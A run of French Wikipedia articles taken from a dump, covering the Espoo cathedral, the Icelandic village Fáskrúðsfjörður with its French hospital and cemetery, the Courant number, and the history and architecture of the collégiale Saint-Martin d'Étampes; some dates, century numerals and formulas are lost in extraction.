Elle est le siège du diocèse d'Espoo de l'église évangélique luthérienne de Finlande. L'église a obtenu le statut de cathédrale en 2004 lorsque le diocèse d'Espoo a été séparé du diocèse d'Helsinki.
Situation.
L'église est située dans le centre d'Espoo, dans le quartier de "Pappilanmäen kirkonmäki", près de la rivière Espoonjoki. 
Cette église, qui date du Moyen Âge, est le plus important et le plus vieux bâtiment historique d'Espoo. 
La cathédrale a été consacrée à l'Apôtre Matthieu. 
Elle est parfois considérée comme étant le plus ancien bâtiment du grand Helsinki, un statut disputé avec l'église Saint-Laurent située à Vantaa.
Histoire.
L'église fut dessinée à la fin du par un maitre inconnu, puis elle fut construite entre 1485 et 1490 sous sa direction. 
Aujourd'hui, les seules parties originelles de l'église médiévale, sont les parties est et ouest de la nef. 
Les bancs et la chaire ont été construits après la Réforme, au début du . Les orgues ont été ajoutés à la fin du . 
À l'origine, l'église a été construite selon un plan à trois nefs, puis agrandie vers une structure en croix sous l'influence de l'architecte Pehr Granstedt de 1821 à 1823, afin d'obtenir une église cruciforme plus spacieuse. Certaines parties de l'église, y compris la sacristie d'origine, ont été démontées lors de cet agrandissement.
Les voûtes et les murs des anciennes parties de la cathédrale sont décorés de peintures murales, en grande partie peintes dans les années 1510. Elles dépeignent des scènes bibliques, comme l'histoire de la création du monde, et des scènes de vie quotidienne, comme la vente de bétail.
Dans les années 1930, les réparations menées par le Professeur Armas Lindgren ont souligné les aspects médiévaux et anciens de cette église en redécouvrant et rénovant ces peintures murales qui étaient jusqu'alors cachées. 
La dernière réparation de l'église a été achevée en 1982 par le professeur Ola Hansson. Le changement le plus visible a été le placement de l'autel entre les deux piliers de devant.
La direction des musées de Finlande a classé la cathérale et son paysage culturel dans les sites culturels construits d'intérêt national.

</doc>
<doc id="3215898" url="https://fr.wikipedia.org/wiki?curid=3215898" title="Fáskrúðsfjörður">
Fáskrúðsfjörður

Fáskrúðsfjörður (parfois appelé aussi "Búðir") est une localité islandaise de la municipalité de Fjarðabyggð située sur un fjord à l'est de l'île, dans la région de l'Austurland. En 2013, le village comptait 654 habitants.
Géographie.
Localisation.
Fáskrúðsfjörður est situé à l'est de l'Islande, sur la côte nord du fjord du même nom, entre les fjords de Reyðarfjörður et Stöðvarfjörður.
Histoire.
Ce village accueillit des marins français venant pêcher sur les côtes islandaises sur une période allant du jusqu'en 1914. Le village abrite un musée rappelant les liens franco-islandais locaux, les panneaux de signalisation sont inscrits en deux langues : français et islandais.
Entre et marins français pêchaient chaque hiver sur les bancs d'Islande.
Fáskrúðsfjörður était un fjord où les pécheurs français se donnaient rendez vous avec un navire ravitailleur venant directement de France, pour leur livrer du courrier, matériel, provision et du sel afin de poursuivre la campagne de pêche. Ce navire ravitailleur retournait le poisson de la première partie de pêche en France. Cette pratique fut interdite par la suite par les autorités danoises pour limiter la durée et les prises des goélettes lors de la campagne de pêche.
Patrimoine local.
Hôpital français de Fáskrúðsfjörður.
L'hôpital français fut fondé en 1903. 
De 1905 à 1912, l'équipe du médecin chef Georg Georgsson (Islandais), est assisté de Marie Baudet, infirmière et peintre française. 
À cette époque, il n'y avait pas d'infirmière capable de comprendre les marins malades ou mourants qui parlaient français ou breton. Ainsi les Français se mirent à collecter de l'argent pour créer leurs propres hôpitaux, à Laugarnes (1898), Landakot (1902), Reykjavik (1902), et aux îles Vestmann (1905-1906).
Marie Baudet infirmière de l'Hôpital Lariboisière de Paris parlait le français évidemment, le breton, l'islandais, le danois et l'anglais, accompagnée de trois jeunes infirmières et assistantes islandaises, en particulier lors de l'épidémie de typhoïde qui a sévi à Reykjavik à cette époque.
Quatre religieuses catholiques de Saint-Joseph sont venues avant la fin du pour soigner les pêcheurs malades à bord des goélettes et les hospitaliser dans la vieille église de Landakot.
Les goélettes françaises se faisant de plus en plus rares, l’hôpital finit par cesser toute activité. En 1939 il fut transporté de l’autre côté du fjord pour y loger des pêcheurs. Lorsque la pêche cessa, l'hôpital fut laissé à l’abandon.
La restauration de l’hôpital français de Fáskrúðsfjörður est un projet en cours depuis quelques années, mais le premier pas concret a été franchi fin , lors des « Journées islandaises » à Gravelines, lorsque la ville de Gravelines, le village de Fáskrúðsfjörður, Minjavernd et l'Alliance française de Reykjavik ont signé un accord pour mener à bien ce projet franco-islandais. Le , la ville de Paimpol s'est jointe au projet en signant un accord de coopération pour la restauration de l'ancien hôpital français.
Il s'agit de remettre l'hôpital à son emplacement initial, le reconstruire entièrement et le rendre vivant à nouveau, restaurer l'ancienne maison du docteur et l'ancienne chapelle dédiée à la mémoire des pêcheurs morts lors des campagnes de pêche pendant des siècles. Ces bâtiments historiques vont dans le futur servir d'hôtel, de centre culturel français, il y aura des appartements pour des chercheurs et artistes français et la chapelle va retrouver son rôle initial, être un lieu sacré où les gens peuvent venir se recueillir.
Une fois le projet terminé il y aura non seulement un ensemble de bâtiments historiques formant le « quartier français » dans le fjord de Fáskrúðsfjörður qui lie les deux nations historiquement, mais aussi un centre culturel vivant qui peut permettre de développer encore les liens amicaux entre France et Islande.
Cimetière français.
Le cimetière des Français morts en mer ou à l’hôpital de Fáskrúðsfjörður regroupe 49 tombes de marins français ou belges. Il est situé un peu à l’extérieur de la ville vers l’est, en contrebas de la route 955. 
Administration.
La commune de Fáskrúðsfjörður fait partie de la municipalité de Fjarðabyggð, avec les localités de Eskifjörður, Mjóifjörður, Neskaupstaður, Reyðarfjörður et Stöðvarfjörður.
Transports.
Fáskrúðsfjörður est située à l'est de la Route 96, sur la route 955. L'ouverture du tunnel Fáskrúðsfjarðargöng en 2005, d'une longueur de 5850 mètres, permet de réduire la distance qui séparait Fáskrúðsfjörður du Nord du pays. 

</doc>
<doc id="3215902" url="https://fr.wikipedia.org/wiki?curid=3215902" title="Achantis">
Achantis



</doc>
<doc id="3215926" url="https://fr.wikipedia.org/wiki?curid=3215926" title="Nombre de Courant">
Nombre de Courant

Le nombre de Courant est un nombre sans dimension utilisé en informatique et en mathématiques et plus particulièrement en calcul par différences finies. Ce nombre porte le nom de Richard Courant, mathématicien allemand.
Définition.
On considère une équation aux dérivées partielles linéaire :
Dans le cas d'un problème à une dimension spatiale, le nombre de Courant est défini de la manière suivante :
formula_2
avec :
Pour des schémas de dimension "n" en espace, le nombre s'écrira sous la forme :
formula_3
les valeurs de chaque intervalle dimensionnel pouvant être choisies indépendamment les unes des autres.
Pour des schémas où la solution est vectorielle et "v" devient une matrice, le nombre s'écrit cette fois-ci comme :
formula_4
où |"v"| est la plus grande valeur propre de "v" en valeur absolue.
Utilisation.
Ce nombre est connu pour son lien avec la condition de Courant–Friedrichs–Lewy (d'après Richard Courant, Kurt Friedrichs, et Hans Lewy) et consiste en une condition de convergence pour résoudre certaines équations aux dérivées partielles (notamment les équations aux dérivées partielles hyperboliques). Dans la pratique, il sert à donner le seuil dimensionnel sous lequel, pour un schéma numérique explicite, on observe une instabilité de calcul (erreur d'approximation) grandissant rapidement au fur et à mesure des calculs. Si la dimension de la grille est inférieure à la distance parcourue dans l'intervalle de pas de temps par l'onde la plus rapide que permet l'équation, l'erreur grandit et envahit la solution physique.
Il est utilisé dans de nombreux domaines comme celui de la prévision numérique du temps.

</doc>
<doc id="3215931" url="https://fr.wikipedia.org/wiki?curid=3215931" title="Galilée (éditions)">
Galilée (éditions)



</doc>
<doc id="3215936" url="https://fr.wikipedia.org/wiki?curid=3215936" title="Les éditions galilée">
Les éditions galilée



</doc>
<doc id="3215941" url="https://fr.wikipedia.org/wiki?curid=3215941" title="Collégiale Saint-Martin d'Étampes">
Collégiale Saint-Martin d'Étampes

La collégiale Saint-Martin d'Étampes est une ancienne collégiale de confession catholique, dédiée à saint Martin de Tours, située dans la commune française d'Étampes et le département de l'Essonne.
Saint-Martin abrite l'un des trois autels paroissiaux primitifs de la ville. Ses origines se perdent dans le temps, et certains auteurs prétendent que son fondateur serait Clovis lui-même.
La collégiale est d'une importance considérable au , quand son chapitre ne compte pas moins de douze chanoines, un doyen et un chantre. En 1106, le roi Philippe Ier la donne à l'abbaye de Morigny. Dès lors, plus aucun chanoine n'est nommé. Des différends entre l'abbaye et le chapitre conduisent à l'expulsion des derniers chanoines en 1142.
L'abbaye établit dès lors un prieuré près de l'église, et entreprend son remplacement par un édifice plus vaste. Les parties basses de son chevet, avec déambulatoire et trois chapelles rayonnantes très profondes, surprennent par un plan évoquant le , et sont encore plus romanes que gothiques, mais le voûtement d'ogives est présent dès le départ. Grâce à des contacts avec l'abbaye de Saint-Denis, l'innovation des arcs-boutants trouve l'une de ses premières applications au chevet de la collégiale Saint-Martin. Le chantier progresse rapidement. Les élévations du vaisseau central s'organisent sur trois niveaux, et s'inspirent de la cathédrale Saint-Étienne de Sens. Au-dessus des grandes arcades, des galeries sont ouvertes sur les combles. La collégiale devient l'un des édifices-clés de la première période gothique. Son achèvement se situe vers 1170, mais une travée supplémentaire est ajoutée après 1213. Enfin, un nouveau clocher est édifié au cours des années 1530 devant la façade. Un tassement de terrain provoque une inclinaison vers l'ouest avant qu'il ne soit terminé, ce qui vaut à l'église d'être parfois appelée la Pise du Nord.
Au , les voûtes des trois dernières travées de la nef s'effondrent et sont remplacées par de fausses voûtes en bois. Le prieuré n'est alors plus qu'un simple bénéfice et est supprimé définitivement en 1781. L'église devient exclusivement paroissiale. Elle est dans un état préoccupant au milieu du , et la première travée notamment est en grande partie démontée, puis reconstruite entre 1872 et 1876. Les travaux de restauration ne sont pas menés en accord avec le service des Monuments historiques. L'ancienne collégiale est néanmoins classée aux monuments historiques par arrêté du . Les messes dominicales y sont actuellement célébrées chaque dimanche soir.
Situation.
La collégiale Saint-Martin se situe en France, en région Île-de-France et dans le département de l'Essonne, dans la Beauce, sur la commune d'Étampes. Elle est implantée dans le faubourg Saint-Martin-d'Étampes, en bordure de l'ancien tracé de la route de Paris à Orléans, la route nationale 20, entre la rive droite de la rivière Louette et la rive gauche de la rivière Juine, à trois kilomètres au sud-ouest du centre-ville historique. L'église est entièrement dégagée de constructions mitoyennes. En venant de la rue Saint-Martin, nom donné à l'ancienne route nationale, la rue Courte débouche sur le clocher-porche qui se dresse devant la façade occidentale. La façade est perpendiculaire à la rue du Cimetière, qui vient également depuis la rue Saint-Martin, au nord, et délimite à l'ouest le terrain de l'ancien cimetière paroissial, qui s'étend au sud de l'église. C'est aujourd'hui une place publique engazonnée et bordée d'arbres, qui met bien en valeur l'élévation méridionale de la collégiale. Au sud, la place est délimitée par la rue Braban, qui se rapproche du chevet vers l'est. Ensuite, l'on peut faire le tour de l'église par le chevet et l'élévation septentrionale par l'étroite rue Jacques Boulas.
Historique.
Les origines.
Le faubourg Saint-Martin, dont le caractère semi-rural est toujours manifeste, est en fait le noyau du développement urbain de la ville d'Étampes. Claudine Billot suppose que le peuplement du site remonte à l'époque mérovingienne. Il y a probablement un palais, qui constitue le centre administratif de la "civitas senonum" et du "pagus stampensis" érigé en comté par Charles II le Chauve en 861, et sans doute aussi une église dédiée à saint Martin de Tours. En 911, le bourg est détruit par les Normands. Il est rebâti, avec les rivières Louette au nord et Chalouette au sud, mais un nouveau noyau urbain prend son essor autour du palais du roi Robert II le Pieux à partir du second quart du . Le bourg de Saint-Martin est déjà qualifié de "Stampæ Vetulæ", soit "Étampes-les-Vieilles" dans un acte de donation du roi Henri daté de 1046, et il évolue désormais dans l'ombre d"'Étampes-les-Nouvelles". Saint-Martin ne devient plus jamais une ville, et demeure pendant des siècles un quartier rural.
Selon certains historiens anciens, Clovis lui-même serait le fondateur de l'église Saint-Martin. Elle a toujours abrité un autel paroissial, et constitue l'une des trois paroisses primitives d'Étampes, avec la collégiale Notre-Dame, près du "castrum", et l'église Saint-Pierre, dans le faubourg éloigné du même nom. Vers 1095, le roi Philippe acquiert des terres pour permettre la fondation de l'abbaye de Morigny, sur une actuelle commune voisine d'Étampes. Afin d'augmenter les revenus de l'abbaye, le roi lui donne l'église Saint-Martin en 1106. Elle est déjà une collégiale, avec un chapitre composé de douze chanoines, et présidé par un doyen et un chantre. L'on ignore l'histoire de ce chapitre jusqu'à cette date. Faisant prévaloir son ancienneté, il refuse la tutelle exercée par l'abbaye de Morigny, et les deux communautés s'opposent pendant plus de trente ans.
L'histoire du chapitre et du prieuré.
Le 11 novembre 1111, le chapitre de Saint-Martin chasse l'abbé de Morigny, qui est venu célébrer la messe patronale, obligeant, l'année suivante, le roi Louis VI à confirmer la donation faite par son père, afin qu'aucun doute sur les prérogatives de l'abbé de Morigny ne soit permis. Si les chanoines font néanmoins la résistance, c'est qu'ils bénéficient du soutien de l'évêque diocésain, Pierre de Corbeil. Les prébendes des chanoines appartiennent désormais à l'abbaye, et le doyen du chapitre est privé de son droit de procéder à la nomination d'un nouveau chanoine quand l'un parmi eux décède. Le chapitre est ainsi appelé à s'éteindre à moyen terme. Puisque l'on ne parvient par aucun moyen à faire cesser les différends, la fin du chapitre est précipitée. En 1140, l'abbaye obtient l'autorisation du pape Innocent II pour expulser les derniers chanoines. C'est chose faite en 1142. Les moines de Morigny remplacent le chapitre par un prieuré dépendant de leur abbaye. Le roi Louis VII leur accorde des droits d'usage du bois à brûler et à bâtir dans la forêt d'Yveline. Ces deux circonstances sont favorables à la construction d'une nouvelle église, la collégiale actuelle, qui commence avant le milieu du siècle par le déambulatoire (voir ci-dessous).
Un règlement de l'évêque de Sens, daté de juin 1213, définit les rapports entre le prieur et le curé relatifs aux messes et cérémonies religieuses dans l'église Saint-Martin, et détermine la part de chacun sur les offrandes et revenus perçus par l'église, pour éviter tout différend à l'avenir. Sous le régime de la commende, le prieuré décline. En 1605, il est mis en fermage, et devient donc, pour l'essentiel, une exploitation agricole. Le fermier verse un revenu annuel fixe au prieur, qui est de seulement, soit seize fois moins que les revenus de l'exploitation agricole en 1774, par exemple. À l'instar de nombreux autres établissements religieux qui n'ont plus de nouvelles vocations ou sont réduits à de simples bénéfices, le prieuré est supprimé pendant la seconde moitié du . Un décret de l'archevêque de Sens en date du 4 mai 1773 et des lettres patentes du roi scellent son destin, et il est réuni au chapitre Sainte-Croix d'Étampes. Du fait de la forte inflation depuis le règne de Louis XIV, les prébendes du chapitre, fixées à par an, ne suffisent plus pour nourrir un chanoine, et le maire, les échevins et l'assemblée de la ville approuvent cette décision. Mais l'évêque de Meaux, Jean-Louis de la Marthonie de Caussade, se prétend indultaire, et la réunion demeure lettre morte jusqu'à la fin de l'année 1781. Il faut attendre une sentence du Grand Conseil en date du 23 décembre pour qu'elle soit enfin exécutée. Tous les chapitres étant supprimés sous la Révolution française, vers 1791, le chapitre de Sainte-Croix ne bénéficie des revenus supplémentaires que pendant une brève période.
L'histoire de la paroisse.
Sous l'Ancien Régime, la paroisse Saint-Martin relève de l'archidiocèse de Sens.
Pendant la deuxième guerre de religion (1567-1568), les Huguenots prennent la ville d'Étampes le 7 octobre 1567. Le culte protestant est instauré dans l'une des églises, mais l'on ne sait pas laquelle, car elle est toujours citée comme la "Huguenoterie" dans les documents d'époque. Ce n'est en tout cas pas l'église Saint-Martin. Certains parents sont plus ou moins obligés de faire baptiser leurs enfants par un pasteur protestant. L'épisode ne dure guère plus que deux mois. Une fois les occupants protestants chassés de la ville, la première occupation des curés est de faire revenir dans le giron de l'église catholique les habitants convertis au Calvinisme, et de faire baptiser les enfants selon le rite catholique, à compter du 14 décembre. Les baptêmes avec des parrains ou marraines notables, à partir de 1568 et jusqu'à la Révolution, et les inhumations dans l'église à partir de 1659 et jusqu'en 1775, ont été publiés, selon les registres paroissiaux, par L. Forteau en 1912. Une déclaration du 6 mai 1776 interdit les inhumations dans les églises, sauf pour les membres du clergé, fondateurs de chapelles et les hauts justiciers.
L'histoire de l'église jusqu'à la Révolution.
Les différentes étapes de la construction de l'église ne sont pas documentées par des sources d'archives. Elles peuvent seulement être déduites grâce à l'analyse archéologique du monument. La date de début des travaux, 1142, concorde tout à fait avec l'architecture du chevet, où des influences romanes sont indéniables. Il n'y a pas de ruptures dans l'appareil ou de changements de style abrupts entre une partie de l'édifice et une partie voisine, ce qui donne à penser que le chantier progresse assez rapidement d'est en ouest. Jacques Henriet observe une interruption après la construction des chapelles du déambulatoire, où la modénature est plus simple. Eugène Lefèvre-Pontalis situe l'achèvement de la nef vers 1170. Le plan exceptionnel du chevet, avec ses trois chapelles bien profondes, évoque le chevet de la crypte de la cathédrale Notre-Dame de Chartres, édifiée sous Fulrad vers 1030. Il est donc possible que l'architecte de la collégiale Saint-Martin reprend le plan ancien, qui devait donc être influencé directement par la cathédrale de Chartres. L'architecture de l'église actuelle est surtout inspirée de la basilique de Vézelay, pour les supports, et de la cathédrale de Sens, pour l'élévation. En 1213, un accord entre le prieur et le doyen d'Étampes prévoit l'agrandissement de la nef par une travée supplémentaire à l'ouest.
Des tassements du terrain et la Guerre de Cent Ans portent préjudice à l'église. Au début du , les voûtes de la croisée du transept et du chœur sont reconstruites sans référence nette au style gothique flamboyant alors en vigueur, mais Philippe Plagnieux souligne que la période de construction est indiquée par les clés de voûte : elles sont sculptées des armes d'Anne de Bretagne et de sa fille Claude, qui ont été comtesses d'Étampes. L'hypothèse émise par René Merlet et adoptée par Eugène Lefèvre-Pontalis, que ces voûtes dateraient du début du , est donc sans objet. Dans le contexte de la réfection des voûtes, les fenêtres hautes sont en partie refaites. Une nouvelle cérémonie de dédicace est célébrée en 1526. Ensuite, le volumineux clocher-porche est construit devant la façade. Son portail et quelques éléments du décor au niveau du rez-de-chaussée annoncent déjà la Renaissance. L'achèvement remonte à 1537. Au , les voûtes des trois dernières travées de la nef s'effondrent, et le faux triforium de la seconde et de la troisième travée est détruit. Le charpentier Chastellin est chargé de leur remplacement par de fausses voûtes d'ogives en bois (l'on sait que l'église de Clermont avait des fausses voûtes d'ogives en bois dès le ).
La restauration de l'église depuis le.
En 1845, l'architecte Pierre Magne, qui travaille alors sur la collégiale Notre-Dame, propose un programme de restauration générale de l'église. Le problème principal est l'affaissement des fondations. En plus, le lanternon en charpente qui couronnait le clocher s'était effondré. Prosper Mérimée est défavorable à son rétablissement, puisqu'il était postérieur au reste de l'édifice. L'intérieur de la tour étant soumis aux intempéries, son état s'aggrave, et son niveau supérieur s'effondre en 1846. Sous la direction de Magne, des travaux sont effectués en 1847. Sur l'initiative du conseil de fabrique, le dallage est refait en 1848. Dans une lettre adressée au sous-préfet en 1858, Magne qualifie l'état global de l'église d'inquiétant. L'avis de l'inspecteur des monuments historiques, Émile Boeswillwald, est sollicité : il estime la réparation impossible, et préconise une reconstruction totale. Ce n'est que cinq ans plus tard que le maire d'Étampes attire l'attention du ministère de l'Instruction publique, qui est aussi responsable des monuments historiques, sur le problème. En attendant, rien n'est entrepris. 
Magne propose de nouveau un programme de travaux en 1867. La ville les juge trop chers, et demande un devis alternatif à l'architecte diocésain Blondel. Mais son projet est considéré comme une mutilation du monument par le service des Monuments historiques. Le 10 mai 1868, la fabrique émet une pétition à l'intention de l'empereur Napoléon III afin d'obtenir les crédits nécessaires. En 1869, l'architecte Juste Lisch succède à Magne, et rédige un nouveau rapport. C'est toutefois les services de l'architecte Blondel que la ville va solliciter, et elle le charge de l'exécution d'une première tranche de travaux. Blondel délègue l'élaboration du devis aux jeunes architectes Louis-Charles Boileau et Roguet. Le devis est présenté le 23 janvier 1872. Lisch estime que ces travaux ne sont pas susceptibles d'arrêter la ruine de l'église, et est donc défavorable. La conséquence est le déclassement de la collégiale des monuments historiques en date du 2 avril 1872. Cependant, le ministère de l'Instruction publique et des Cultes est disposé à prêter son concours financier aux restaurations. La façade occidentale est entièrement démolie jusqu'aux fondations, ainsi que la moitié de la première travée. Les deux portails sont reconstitués avec les éléments d'origine. Le triforium, qui n'a jamais existé sous cette forme dans la première travée, est reconstitué par le sculpteur Sandrier. La voûte est refaite en briques creuses, et une travée de porche est ajoutée entre clocher et façade.
Par arrêté du , la collégiale est de nouveau classée aux monuments historiques. En 1916, la toiture de la nef est dans un état de délabrement avancé. Un devis de Lucien Roy daté du 23 juin 1916 est approuvé le 20 août 1917 ; malgré la Première Guerre mondiale, l'autorisation de commencer les travaux est livrée le 25 avril 1918. Les travaux sont exécutés au cours des années de 1918 et 1919. Malheureusement, pendant l'hiver 1919 / 1920, une violente tempête arrache le versant sud du toit de la nef au niveau de la et de la , sur une longueur de . La réparation se fait attendre jusqu'au mois d'octobre 1922. Par la suite, la réfection des toitures des bas-côtés et de l'abside s'impose également. Un premier devis est présenté par l'architecte Albert-Louis Bray le 7 avril 1927. La municipalité lui demande de réviser ce devis, et il soumet un nouveau devis en date du 3 février 1928. L'autorisation d'entreprendre les travaux est délivrée le 9 février 1929, et ils sont menés à terme avant la fin de l'année.
Manque encore la restauration de la toiture du déambulatoire et des chapelles. Les chevrons sont en partie pourris, les toits se sont affaissés et les eaux pluviales s'infiltrent. Le devis de Bray en date du 21 juin 1930 est approuvé le 28 janvier suivant, mais l'exécution se fait seulement entre le 10 mai et le 20 septembre 1935. En 1934, l'église est équipée d'une installation électrique, qui n'est pas conforme aux exigences de sécurité, et nuisible à l'aspect esthétique de l'intérieur. Le chauffage par le sol est installé en 1937. Entre-temps, la couverture du clocher nécessite elle aussi une réparation. Neuf ans s'écoulent entre le premier devis du 14 mars 1932 et l'autorisation d'effectuer les travaux, qui est accordée le 16 octobre 1941. Cependant les travaux sont ajournés et ne sont exécutés qu'entre 1953 et septembre 1956. Entre 1962 et 1965 le côté nord de la nef est profondément restauré, principalement à l'extérieur, avec remplacement de deux arcs-boutants et du parement.
Description.
Aperçu général.
Parfaitement orientée, la collégiale est construite en pierre de taille calcaire, et adopte un plan cruciforme symétrique. Elle se compose d'une nef de quatre travées accompagnée de deux bas-côtés ; d'un transept non saillant dont les croisillons n'atteignent pas la hauteur du vaisseau central ; d'une abside en hémicycle à cinq pans ; d'un déambulatoire de cinq travées ; et de trois chapelles rayonnantes devant la seconde, la troisième et la quatrième travée du déambulatoire. Chaque chapelle comporte une travée droite, qui est carrée pour la chapelle axiale et barlongue pour les deux autres, et une abside en hémicycle à trois pans, qui forme une travée à part. La chapelle d'axe est placée sous l'invocation du Saint-Sacrement ; les deux autres sont dédiées à Saint-Vincent et à Saint-Martin. Comme annexes ajoutés ultérieurement, il y a le clocher-porche de 1537, relié à la façade occidentale par une petite travée datant de 1873 ; une sacristie devant le croisillon sud ; et une seconde sacristie entre la chapelle axiale et la chapelle nord-est.
L'ensemble de l'édifice mesure quatre-vingt mètres de long, trente-cinq mètres de large et dix-huit mètres de haut. Toutes les travées sont voûtées d'ogives, mais les voûtes des trois premières travées sont en bois. La voûte de la base du clocher est à huit nervures, et percée d'un trou de cloches en son centre. La voûte de l'abside est à cinq branches d'ogives, et les voûtes des absides des chapelles sont à deux branches d'ogives. Comme particularité, quatre voûtes triangulaires s'insèrent entre les voûtes à quatre branches d'ogives du déambulatoire. Parmi elles, celles situées près de la chapelle d'axe sont séparées en deux voûtains par une ogive. Des portails existent sous le clocher ; dans la façade du bas-côté sud ; et dans la seconde travée du bas-côté sud. Le vaisseau central est recouvert d'une toiture unique à deux versants. Les toits en appentis des croisillons sont établis en continuité avec cette toiture. Les bas-côtés sont eux aussi munis de toits en appentis.
Intérieur.
Nef.
La nef présente une élévation sur trois niveaux, avec l'étage des grandes arcades, l'étage des fausses galeries (ou faux triforium), et l'étage des fenêtres hautes. À l'ouest, la première travée est précédée par une très courte travée voûtée en berceau. La première travée est aujourd'hui apparentée aux autres. À moins que la travée supplémentaire dont la construction fut décidée en 1213 ait cédé la place au clocher, elle doit résulter, dans sa forme actuelle, des travaux entrepris au cours des années 1870. En tout cas, les arcades des tribunes de la première travée sont une reconstitution à part entière, car elles avaient été détruites lors de l'effondrement des voûtes au . Les voûtes en bois de 1761 ne sont pas facilement identifiables comme telles, car recouvertes de badigeons et peintes en faux-appareil, et munies de nervures qui imitent habilement celles du troisième quart du . Elles paraissent toutefois bien minces par rapport aux distances à enjamber. Les ogives sont au profil d'un tore placé sur un bandeau chanfreiné ; les doubleaux sont au profil d'un filet entre deux tores. Ils retombent sur les tailloirs carrés de trois chapiteaux, qui sont portés par une colonnettes et un large dosseret aux arêtes coupées, devant lequel la colonnette fait saillie. Les formerets, non prévus dans le projet initial, retombent sur des colonnettes à chapiteaux qui descendent directement aux chapiteaux des grandes arcades, et ne sont par conséquent pas concernés par les chapiteaux du second ordre. Cette disposition ne s'applique, bien entendu, qu'aux doubleaux du milieu du . Au niveau des deux doubleaux qui délimitent la première travée, les nervures retombent sur des faisceaux de cinq colonnettes, dont celle correspondant au doubleau lui-même est plus forte que les autres. Les chapiteaux du doubleau à l'intersection avec la seconde travée ont perdu leur sculpture.
L'arc brisé règne partout dans la nef. Ceci vaut aussi bien pour les voûtes, que pour les fenêtres, les baies des fausses galeries et les grandes arcades. L'étage des fenêtres hautes correspond aux lunettes des voûtes, et n'a bénéficié d'aucun effort décoratif. Les baies sont des lancettes simples, nettement ébrasées, sans la moindre mouluration. Il y aurait toutefois des vestiges de meneaux coupés, ce qui donne à penser que le parti initial comportait des lancettes gémelées. Dans la quatrième travée, les fenêtres sont plus grandes. Aucun élément de scansion ne souligne la limite supérieure de l'étage des fausses galeries, qui imite la disposition dans la cathédrale de Sens. Ses arcades étaient initialement ouvertes sur les combles, et ne possédaient pas de rétroéclairage par une claire-voie (pour des vraies galeries, il aurait fallu des espaces aménagés avec plancher, murs et plafond voûté, ou pour un triforium, des murs de refend). Les arcades d'origine ne subsistent plus que dans la quatrième travée. Sous deux arcs de décharge, qui sont moulurés d'un tore et retombent sur des colonnettes à chapiteaux, s'inscrivent deux fois deux petites arcades gémelées, qui retombent sur un total de trois colonnettes à chapiteaux. Les tympans au-dessus des arcades gémelées sont pleins. Les colonnettes sont appareillées, sauf celles au milieu entre deux petites arcades, qui sont en délit. Un bandeau mouluré sert d'appui aux baies des galeries, et marque à la fois la limite de l'étage des grandes arcades. Celles-ci sont à double rouleau. Comme généralement à la première période gothique, le rouleau supérieur est mouluré d'un tore dégagé de chaque côté, et le rouleau inférieur présente un méplat entre deux tores dégagés. Les supports correspondent exactement à ceux du second ordre, et c'est également le cas à l'intérieur des bas-côtés. Les piliers de la campagne de travaux terminé vers 1170 sont donc cruciformes, et seulement quatre colonnettes sont engagées dans chaque pilier, soit une au milieu de chaque face. Ce type de pilier est hérité du monde roman, et plus particulièrement inspiré de la basilique de Vézelay. Ce n'est qu'à l'intersection entre la première et la seconde travée que l'on rencontre des piliers fasciculées conventionnelles, qui sont cantonnées de quatre fortes colonnettes, et de quatre fois trois colonnettes de plus faible diamètre, sachant que les doubleaux des bas-côtés à ce niveau sont analogues aux grandes arcades.
Bas-côtés et porche.
Les bas-côtés mettent bien en évidence les deux types de piliers différents, ceux du troisième quart du et ceux du début du . Les supports engagés dans les murs répondent toujours au système des piliers en face. Ce sont donc, entre la seconde et la quatrième travée, de larges dosserets contre lesquels des colonnettes uniques sont appliquées. Une petite différence est que les tailloirs des chapiteaux des ogives, aux angles des dosserets, ont l'angle abattu. Les doubleaux de la même période ne sont pas identiques aux grandes arcades : le rouleau supérieur n'est pas mouluré et seulement chanfreiné, et le méplat entre les deux tores du rouleau inférieur est remplacé par une arête. C'est un profil habituel pour les ogives, mais exceptionnel pour les doubleaux et arcades, qu'on retrouve au déambulatoire. Ces doubleaux sont reçus sur trois tailloirs. Il n'y a donc pas de tailloirs dédiés pour les ogives, ni du reste pour les formerets.
En revanche, les deux seuls doubleaux du début du correspondent tout à fait aux grandes arcades de la première travée, et ici, le principe de l'équivalence du nombre des éléments à supporter et du nombre des supports est respecté. Les faisceaux de colonnettes au droit des murs gouttereaux comportent cinq colonnettes, et trois colonnettes sont logées dans les angles. En ce qui concerne les voûtes, seulement celles de la quatrième travée ont été réalisées de les années 1150 / 1160. Les ogives sont au profil d'un tore dégagé, placé sur un bandeau biseauté. Les clés de voûte sont de minuscules rosaces, qui ne dépassent pas le diamètre des ogives. Les autres voûtes ont été lancées à l'occasion de l'agrandissement de la nef par la travée supplémentaire, au début du . Elles sont assez similaires, mais le tore des ogives est en forme d'amande, et le bandeau en arrière-plan ne déborde plus. Les clés de voûte sont percés d'un trou, sans le moindre décor sculpté. Les élévations latérales ne présentent aucune particularité. L'éclairage est assuré par des lancettes simples.
Sous la travée de porche qui a été insérée entre le clocher et la façade au cours des travaux de restauration entre 1872 et 1876, l'on trouve le portail occidental du début du , qui a été remonté lors de la restauration. Beaucoup de blocs sculptés ont été refaits. Le tympan et le linteau n'ont pas été restitués ; ils avaient été supprimés à une période indéterminée pour tenir compte de l'exhaussement du sol. L'archivolte se compose de trois voussures moulurées d'un gros tore dégagé ; elle est en outre surmontée d'un bandeau mouluré qui est reçu sur deux culots simples.
L'archivolte retombe sur deux faisceaux de trois colonnettes à chapiteaux. Ils sont sculptés de crochets aux angles, et de feuilles appliquées au milieu des corbeilles. Sur les chapiteaux du rang de claveaux inférieur, se profilent de petites chimères, ce qui paraît peu cohérent avec le style gothique primitif, et trahit sans doute qu'il s'agit d'apports de la restauration des années 1870. Sur les piédroits du portail, le motif des chapiteaux se continue en tant que frise : une chimère apparaît à gauche, et deux crochets à droite. La base du clocher elle-même est sans intérêt. Deux hautes niches ébrasées au nord et au sud correspondent à d'anciens portails bouchés. À l'ouest, le portail occidental actuel s'ouvre sous un arc de décharge en anse de panier. Les huit nervures de la voûte retombent sur de grêles colonnettes à chapiteaux logées dans les angles. Le centre de la voûte est percé d'un trou pour la remontée des cloches.
Transept.
